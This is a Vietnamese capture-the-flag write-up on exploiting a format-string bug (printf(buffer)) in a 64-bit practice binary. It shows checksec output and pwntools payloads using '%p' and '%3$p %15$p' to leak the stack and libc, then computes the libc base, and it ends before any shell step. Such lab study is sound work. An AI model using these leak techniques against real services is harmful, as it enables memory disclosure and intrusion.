## Lược qua:

Sử dụng lỗ hổng format strings để khai thác từ việc leak libc, write shell và thực thi

___
## Cách giải:
### Thông tin:
Kiểm tra thông tin file:
```                                                                                                
┌──(kali㉿kali)-[~/CTFs/testCTF/fmtstring1]
└─$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=27e9b2e732eb3f9bed3b3f248f212ac998a5263a, for GNU/Linux 3.2.0, not stripped
                                                                                                   
┌──(kali㉿kali)-[~/CTFs/testCTF/fmtstring1]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   43 Symbols  No     0               2               chall
```
* file ELF 64-bit và dynamically linked
* chỉ có `canary` tắt

Disassembly code:
```c
int main(void)

{
  int check;
  char buffer [64];
  
  setup();
  do {
    fgets(buffer,64,stdin);
    printf(buffer);
    check = strncmp(buffer,"quit",4);
  } while (check != 0);
  return 0;
}
```
* `printf(buffer);`: lỗ hổng format string
* `do { .. } while`: cho phép sử dụng fmt str nhiều lần
___
### Khai thác:
* Trước hết chạy thử payload format string `%p`:
```python
payload = b'AAAA %p %p %p %p %p'
p.sendline(payload)
```

<img width="804" height="101" alt="image" src="https://github.com/user-attachments/assets/eef33098-eb1b-4393-b09c-2f84b04700b7" />
<img width="807" height="519" alt="image" src="https://github.com/user-attachments/assets/29ef0a16-1531-49a4-8cb8-f100c0652fae" />
Thấy được là `%p` thứ 3 leak được địa chỉ buffer

Note tìm hiểu được: với file 64-bit, 6 arguments đầu tiên của printf là nằm ở thanh ghi, tới argument thứ 7 là nằm trên stack

* Bên cạnh đấy, thấy được địa chỉ `return` của `main()`:

<img width="806" height="388" alt="image" src="https://github.com/user-attachments/assets/21a9dc96-7f6d-4dd7-9f6d-d5f7ec1de89e" />

Để tính ra vị trí format string của return, ta áp dụng
```
(địa chỉ - rsp)/8 + 6
```
( `.. + 6` vì format string bắt đầu đọc từ stack tại offset thứ 6)

Như sau:

<img width="804" height="498" alt="image" src="https://github.com/user-attachments/assets/b85f60d8-6f10-4f8e-bff2-3e8a3a5b4a2d" />

* Vậy ta có:
```python
payload = b'%3$p' + b' %15$p' 
p.sendline(payload)
```
Kiểm chứng lại:

<img width="802" height="125" alt="image" src="https://github.com/user-attachments/assets/394efdf2-c677-4927-a8ae-5db4139ac27c" />

<img width="801" height="329" alt="image" src="https://github.com/user-attachments/assets/198159ce-f875-4e8b-9898-b464e0aab4dd" />


* Để tìm địa chỉ libc base, ta tìm offset giữa libc_leak và libc_base (tại runtime):

<img width="806" height="509" alt="image" src="https://github.com/user-attachments/assets/64efce5d-e2cb-4cd6-bd0c-9ff1ce9f8265" />

<img width="808" height="588" alt="image" src="https://github.com/user-attachments/assets/d0428caa-b11c-4b3e-ac2b-8a5eaf3bf714" />

```python
offset = 0x29ca8
```
Vậy tính libc base mặc định bằng cách:
```python
libc.address = leak_libc - 0x29ca8
```
















